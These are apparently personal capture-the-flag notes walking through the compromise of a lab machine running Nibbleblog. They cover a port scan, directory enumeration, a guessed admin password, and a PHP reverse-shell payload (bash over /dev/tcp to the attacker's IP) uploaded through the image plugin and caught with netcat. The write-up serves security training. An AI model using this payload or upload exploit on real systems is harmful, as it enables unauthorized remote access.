
> [!tip] Task
> **Gain a foothold on the target and submit the user.txt flag**

# Step 1: Initial Scan
We have to discover if there are open TCP ports
```
┌──(kali㉿kali)-[~]
└─$ nmap -sV -sC 10.129.124.195
```
![[Pasted image 20260829183725.png]]

We can see there are **2 ports open**:
- Port 22
- Port 80

# Step 2: Web Enumeration
We have to inspect the web application, could be using the browser or, if browser we cant see anything interesting,  we can use `curl`, which is the case of us
```
┌──(kali㉿kali)-[~]
└─$ curl http://10.129.124.195/
```
![[Pasted image 20260829184418.png]]

We can notice a comment saying to visit the directory `/nibbleblog/`

`http://10.129.124.195/nibbleblog/`
![[Pasted image 20260829184614.png]]

Cool, here we have more interesting things

# Step 3: Application Analysis
Once we find the endpoint, we can analyze everything on it
```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://10.129.124.195/nibbleblog/ -w /usr/share/wordlist/dirb/common.txt -t 50
```
![[Pasted image 20260829210605.png]]

There's a lot going on here. It's easy to get lost with so many directories, subdirectories, and files, but let's start with a high-level overview
![[Pasted image 20260829211049.png]]

| **Category**         | **Typical Names**                         | **Priority**     | **Why You Look Here**                                                                                                    |
| -------------------- | ----------------------------------------- | ---------------- | ------------------------------------------------------------------------------------------------------------------------ |
| **Entry Points**     | `admin.php`, `login.php`, `dashboard/`    | **High**         | Gives you interactive forms to test credentials, bypass logic, or access control panels.                                 |
| **Stored Data**      | `content/`, `private/`, `uploads/`, `db/` | **High**         | Flat-file databases, user XML files, uploaded media, and configuration settings live here.                               |
| **Application Code** | `plugins/`, `themes/`, `includes/`        | **Medium**       | Contains third-party add-ons and code modules. Plugins are frequently source code audited for unpatched vulnerabilities. |
| **Static Assets**    | `css/`, `js/`, `images/`, `languages/`    | **Low / Ignore** | Standard layout, styling, and static text assets. Rarely contain user data or server-side vulnerabilities.               |
In our case, we're interested in these directories and files:
- **/admin.php**
- **/content/**
- **/plugins/**
- **README**
Now, we can use `gobuster` or use the browser to analyze each of the founded directories and files
- **/content/**: In `/content/private/users.xml` we can see a DB of users in the web site, in our case here are only 1 user "admin". We can use this info to go to login page (`/admin.php`) and try trivial password, like `nibbles`(luckily, it work)
![[Screenshot 2026-08-30 080909.png]]

Great, now we have admin access to the web page. If we sniff there, we can find that we can upload files in `Plugins --> My Image` which route is `http://<ip_target>/nibbleblog/content/private/plugins/my_image/`

![[Screenshot 2026-08-30 081520.png]]

Luckily, we can upload everything that we want, so we can upload a reverse shell

**Code**
```
<?php system("bash -c 'bash -i >& /dev/tcp/10.10.15.46/8000 0>&1'"); ?>
```

We save this code in a file, and then upload this file to the web page. Now, to run it, we have to go to `http://<ip_target>/nibbleblog/content/private/plugins/my_image/image.php`. But first, we have to listen at the port we type in the code. 
```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 8000
```
![[Screenshot 2026-08-30 082055.png]]

We got it! Now we can do a lot of things, sniff around there, and try whatever we want